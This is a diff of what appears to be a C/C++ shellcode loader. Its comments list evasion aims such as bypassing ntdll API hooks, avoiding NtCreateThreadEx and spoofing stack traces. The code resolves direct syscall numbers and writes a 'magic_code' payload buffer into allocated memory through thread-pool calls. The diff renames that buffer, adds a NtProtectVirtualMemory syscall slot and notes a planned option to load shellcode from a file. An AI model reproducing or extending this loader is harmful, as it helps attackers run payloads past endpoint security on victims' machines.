@@ -8,6 +8,7 @@ Avoid calling NtCreateThreadEx
 Full stack trace proof
 Bypass ntdll API h00ks without patching
 Todo: add hash to Halo's gate.
+# update support argument -bin position_independent_code.bin as input instead of hardcoded code. 
 **/
 /***
 
@@ -323,6 +324,7 @@ PVOID findSyscallInstruction(const char* apiName, FARPROC pApi, int occurrence)
 
 extern "C" {
     DWORD SSNAllocateVirtualMemory;
+    DWORD SSNProtectVirtualMemory;
     DWORD SSNWriteVirtualMemory;
     DWORD SSNCreateThreadEx;
     DWORD SSNWaitForSingleObject;
@@ -451,8 +453,8 @@ int main(int argc, char *argv[]) {
     LPVOID allocatedAddress = NULL;
 
     //print the first 8 bytes of the magiccode and the last 8 bytes:
-    printf("First 8 bytes: %02x %02x %02x %02x %02x %02x %02x %02x\n", magiccode[0], magiccode[1], magiccode[2], magiccode[3], magiccode[4], magiccode[5], magiccode[6], magiccode[7]);
-    printf("Last 8 bytes: %02x %02x %02x %02x %02x %02x %02x %02x\n", magiccode[sizeof(magiccode) - 8], magiccode[sizeof(magiccode) - 7], magiccode[sizeof(magiccode) - 6], magiccode[sizeof(magiccode) - 5], magiccode[sizeof(magiccode) - 4], magiccode[sizeof(magiccode) - 3], magiccode[sizeof(magiccode) - 2], magiccode[sizeof(magiccode) - 1]);
+    printf("First 8 bytes: %02x %02x %02x %02x %02x %02x %02x %02x\n", magic_code[0], magic_code[1], magic_code[2], magic_code[3], magic_code[4], magic_code[5], magic_code[6], magic_code[7]);
+    printf("Last 8 bytes: %02x %02x %02x %02x %02x %02x %02x %02x\n", magic_code[sizeof(magic_code) - 8], magic_code[sizeof(magic_code) - 7], magic_code[sizeof(magic_code) - 6], magic_code[sizeof(magic_code) - 5], magic_code[sizeof(magic_code) - 4], magic_code[sizeof(magic_code) - 3], magic_code[sizeof(magic_code) - 2], magic_code[sizeof(magic_code) - 1]);
     
 
 	const char libName[] = { 'n', 't', 'd', 'l', 'l', 0 };
@@ -504,7 +506,8 @@ int main(int argc, char *argv[]) {
     ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);
     // getchar();
     printf("[+] Allocated size: %lu\n", allocatedSize);
-    printf("[+] MagicCode size: %lu\n", sizeof(magiccode));
+    printf("[+] MagicCode size: %lu\n", sizeof(magic_code));
+    printf("[+] allocatedAddress: %p\n", allocatedAddress);
 /// Write memory: 
     // if(allocatedAddress == NULL) {
     //     // printf("[-] Failed to allocate memory\n");
@@ -531,7 +534,7 @@ int main(int argc, char *argv[]) {
     ntWriteVirtualMemoryArgs.pNtWriteVirtualMemory = (UINT_PTR) syscallAddr2;
     ntWriteVirtualMemoryArgs.hProcess = (HANDLE)-1;
     ntWriteVirtualMemoryArgs.address = allocatedAddress;
-    ntWriteVirtualMemoryArgs.buffer = (PVOID)magiccode;
+    ntWriteVirtualMemoryArgs.buffer = (PVOID)magic_code;
     ntWriteVirtualMemoryArgs.size = allocatedSize;
     ntWriteVirtualMemoryArgs.bytesWritten = bytesWritten;
 
